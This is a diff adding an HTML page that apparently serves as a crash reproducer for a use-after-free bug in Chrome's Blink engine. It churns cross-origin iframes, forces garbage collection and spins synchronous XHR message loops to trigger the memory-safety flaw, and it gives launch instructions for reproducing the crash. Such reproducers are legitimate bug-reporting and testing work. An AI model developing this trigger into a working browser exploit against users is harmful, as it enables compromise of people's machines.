@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blink AgentRegistry Continuous Stress Test (IPC / GC)</title>
+    <style>
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            margin: 25px;
+            background-color: #f1f5f9;
+            color: #0f172a;
+        }
+        h1 {
+            font-size: 26px;
+            margin-bottom: 10px;
+            color: #1e293b;
+        }
+        p {
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        .dashboard {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 25px;
+        }
+        .card {
+            background: #fff;
+            padding: 22px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);
+            border-top: 4px solid #3b82f6;
+        }
+        .card h2 {
+            font-size: 19px;
+            margin-top: 0;
+            margin-bottom: 15px;
+            color: #1d4ed8;
+        }
+        button {
+            background-color: #3b82f6;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.2s;
+        }
+        button:hover {
+            background-color: #2563eb;
+        }
+        button.danger {
+            background-color: #ef4444;
+            border-top-color: #dc2626;
+        }
+        button.danger:hover {
+            background-color: #dc2626;
+        }
+        #iframe-sandbox {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 20px;
+            padding: 20px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);
+            min-height: 300px;
+            border: 1px solid #cbd5e1;
+        }
+        iframe {
+            width: 120px;
+            height: 90px;
+            border: 1px solid #94a3b8;
+            border-radius: 6px;
+            background: #f8fafc;
+        }
+        #status {
+            font-weight: bold;
+            color: #10b981;
+        }
+        .busy {
+            color: #ef4444 !important;
+        }
+        ul {
+            margin: 0;
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Blink AgentRegistry Continuous Stress Test (IPC / GC)</h1>
+    <p>
+        This reproducer is a <strong>continuous, high-frequency stress test</strong> designed to trigger the 
+        nested IPC message loop / GC reclamation Use-after-Free crash. It constantly mounts and unmounts 
+        30 cross-origin iframes (OOPIFs) inside active engine probes while simultaneously firing synchronous XHRs 
+        (spinning Mojo IPC loops) and forcing massive GC sweeps.
+        <br><br>
+        <strong>To reproduce the crash:</strong> Open Chrome DevTools (F12) to ensure `InspectorLogAgent` is active, 
+        launch Chrome with <code>--js-flags="--expose-gc"</code>, then click "Start Continuous Stress Test".
+    </p>
+
+    <div class="dashboard">
+        <div class="card">
+            <h2>Control Panel</h2>
+            <button id="toggle-btn" onclick="toggleStressTest()">Start Continuous Stress Test</button>
+            <p style="margin-top: 18px;">Status: <span id="status">IDLE</span></p>
+            <p>Iframe Lifecycle Ops: <span id="ops-counter">0</span></p>
+            <p>Allocated Garbage: <span id="garbage-counter">0</span> MB</p>
+        </div>
+        <div class="card" style="border-top-color: #ef4444;">
+            <h2>Active Stress Mechanisms</h2>
+            <ul>
+                <li>30 Concurrent OOPIF Local Roots</li>
+                <li>High-Frequency Iframe Detachment</li>
+                <li>Synchronous XHR IPC Thrashing</li>
+                <li>Continuous Layout & Style Thrashing</li>
+                <li>Aggressive Heap Allocation & <code>window.gc()</code></li>
+            </ul>
+        </div>
+    </div>
+
+    <h2>Dynamic OOPIF Sandbox</h2>
+    <div id="iframe-sandbox"></div>
+
+    <script>
+        let isRunning = false;
+        let opsCount = 0;
+        let totalGarbageMB = 0;
+        const sandbox = document.getElementById('iframe-sandbox');
+        const statusEl = document.getElementById('status');
+        const opsEl = document.getElementById('ops-counter');
+        const garbageEl = document.getElementById('garbage-counter');
+        const toggleBtn = document.getElementById('toggle-btn');
+
+        // List of cross-origin URLs to enforce Out-of-Process Iframe (OOPIF) local root creation
+        const oopifUrls = [
+            'https://example.com',
+            'https://example.org',
+            'https://example.net',
+            'data:text/html,<h1>OOPIF Sandbox</h1>'
+        ];
+
+        function toggleStressTest() {
+            isRunning = !isRunning;
+            if (isRunning) {
+                statusEl.textContent = 'CONTINUOUS STRESSING...';
+                statusEl.className = 'busy';
+                toggleBtn.textContent = 'Stop Continuous Stress Test';
+                toggleBtn.className = 'danger';
+                startStressLoops();
+            } else {
+                statusEl.textContent = 'IDLE';
+                statusEl.className = '';
+                toggleBtn.textContent = 'Start Continuous Stress Test';
+                toggleBtn.className = '';
+                sandbox.innerHTML = '';
+            }
+        }
+
+        function startStressLoops() {
+            if (!isRunning) return;
+
+            // 1. Maintain a pool of 30 OOPIF local roots
+            maintainIframePool();
+
+            // 2. Force Layout Thrashing (triggers UpdateLayout & RecalculateStyle probes)
+            forceLayoutThrashing();
+
+            // 3. Trigger Microtask Re-entrancy
+            queueMicrotask(() => {
+                if (!isRunning) return;
+                thrashIframesAndIpc();
+            });
+
+            requestAnimationFrame(startStressLoops);
+        }
+
+        // 1. Maintain Iframe Pool
+        function maintainIframePool() {
+            // Unmount a batch of existing iframes
+            const iframes = sandbox.querySelectorAll('iframe');
+            for (let i = 0; i < Math.min(iframes.length, 10); i++) {
+                iframes[i].remove();
+                opsCount++;
+            }
+
+            // Mount new cross-origin iframes
+            while (sandbox.children.length < 30) {
+                const iframe = document.createElement('iframe');
+                iframe.src = oopifUrls[Math.floor(Math.random() * oopifUrls.length)];
+                
+                // Attach load and error listeners to trigger CallFunction probes during lifecycle changes
+                iframe.onload = () => { if (isRunning && Math.random() < 0.5) thrashIframesAndIpc(); };
+                iframe.onerror = () => { if (isRunning && Math.random() < 0.5) thrashIframesAndIpc(); };
+
+                sandbox.appendChild(iframe);
+                opsCount++;
+            }
+        }
+
+        // 2. Layout Thrashing
+        function forceLayoutThrashing() {
+            sandbox.style.width = (Math.random() * 15 + 85) + '%';
+            const forceReflow = sandbox.offsetWidth;
+            sandbox.style.backgroundColor = Math.random() < 0.5 ? '#fff' : '#f8fafc';
+        }
+
+        // 3. The Ultimate Core Mechanism: Detach + Sync XHR IPC + Massive GC
+        function thrashIframesAndIpc() {
+            if (!isRunning) return;
+
+            // Step A: Unmount random iframes inside an IIFE so local JS stack variables pop
+            (() => {
+                const iframes = sandbox.querySelectorAll('iframe');
+                if (iframes.length > 0) {
+                    iframes[Math.floor(Math.random() * iframes.length)].remove();
+                    opsCount++;
+                }
+            })();
+
+            // Step B: Aggressively allocate heap memory to force V8/Oilpan GC marking
+            allocateGarbage();
+
+            // Step C: Explicitly invoke V8 Garbage Collector if exposed via --js-flags="--expose-gc"
+            if (typeof window.gc === 'function') {
+                window.gc();
+            }
+
+            // Step D: Execute a synchronous XHR to spin a nested Mojo IPC message loop
+            // While this synchronous network request blocks, the engine idles inside a nested message loop, 
+            // allowing Oilpan to sweep and destroy the detached CoreProbeSink before the outer probe destructor runs.
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', location.href, false); // Synchronous request
+                xhr.send();
+            } catch (e) {
+                // Ignore network errors
+            }
+        }
+
+        function allocateGarbage() {
+            const garbageChunk = new Array(50000).fill('BLINK_AGENT_REGISTRY_CONTINUOUS_STRESS_TEST_GARBAGE_DATA');
+            const serialized = JSON.stringify(garbageChunk);
+            totalGarbageMB += Math.round((serialized.length * 2) / (1024 * 1024));
+            garbageEl.textContent = totalGarbageMB;
+        }
+
+        // High-frequency background interval loops
+        setInterval(() => {
+            if (!isRunning) return;
+            thrashIframesAndIpc();
+        }, 10);
+
+        setInterval(() => {
+            if (!isRunning) return;
+            maintainIframePool();
+        }, 25);
+
+        // Ops Counter Display Update
+        setInterval(() => {
+            if (!isRunning) return;
+            opsEl.textContent = opsCount;
+        }, 1000);
+    </script>
+</body>
+</html>
+
